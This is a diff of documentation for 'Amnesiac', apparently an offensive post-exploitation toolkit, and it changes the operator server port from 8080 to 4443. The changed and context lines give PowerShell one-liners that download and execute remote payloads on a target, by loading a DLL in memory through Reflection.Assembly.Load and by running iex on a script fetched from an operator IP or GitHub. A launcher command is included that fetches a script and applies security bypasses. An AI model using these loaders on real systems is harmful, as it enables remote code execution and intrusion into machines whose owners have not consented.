@@ -63,9 +63,9 @@ iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com
 
 **With operator HTTP server on network (preferred — no outbound GitHub from target):**
 ```powershell
-$_a=[Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData('http://<operator-IP>:8080/acE6zHaZfi.dll'))
+$_a=[Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData('http://<operator-IP>:4443/acE6zHaZfi.dll'))
 $_a.GetType('acE6zHaZfi.DiWALSMq4L').GetMethod('voT3ptbqo9').Invoke($null,$null)
-iex (New-Object Net.WebClient).DownloadString('http://<operator-IP>:8080/Amnesiac_ShellReady.ps1');Amnesiac
+iex (New-Object Net.WebClient).DownloadString('http://<operator-IP>:4443/Amnesiac_ShellReady.ps1');Amnesiac
 ```
 
 **PS-only fallback (weaker — use if DLL unavailable):**
@@ -333,7 +333,7 @@ Requires: MSVC build tools at `C:\Program Files (x86)\Microsoft Visual Studio\20
 ### Usage
 
 ```
-amnesiac_launcher.exe http://<operator-IP>:8080
+amnesiac_launcher.exe http://<operator-IP>:4443
 ```
 
 Operator's `serve` must be running to serve `Amnesiac_ShellReady.ps1`. The launcher fetches it, applies bypasses, and runs the full Amnesiac session in a native process.
@@ -360,7 +360,7 @@ Tools reach targets via the named pipe channel exclusively — no network calls 
 Implemented as a helper called by `Send-Module`, `Start-LocalShell` keyword dispatch, and `load <name>`. When a tool is not found in tiers 1–2, it fetches `https://raw.githubusercontent.com/0xSiarheiStar/Amnesiac/main/Tools/<ToolName>.ps1` operator-side, caches it in `$global:ToolCache`, and proceeds normally. This is the correct fallback for Scenario 2 (operator has only the compromised machine, no local server). Target never makes any network call.
 
 **Binary tool fetch (`Fetch-BinaryTool`):**
-Used by `RunBin`. Fetches `.exe` or `.dll` binaries via `DownloadData` (binary-safe), stores as base64 in `$global:ToolCache`. Tries `http://<ListenerIP>:8080/<name>.exe` then `.dll` first, then falls back to GitHub. Binary and script caches are unified — same `$global:ToolCache` key, different content type inferred from usage context.
+Used by `RunBin`. Fetches `.exe` or `.dll` binaries via `DownloadData` (binary-safe), stores as base64 in `$global:ToolCache`. Tries `http://<ListenerIP>:4443/<name>.exe` then `.dll` first, then falls back to GitHub. Binary and script caches are unified — same `$global:ToolCache` key, different content type inferred from usage context.
 
 ### Target-Side Delivery (in-session)
 
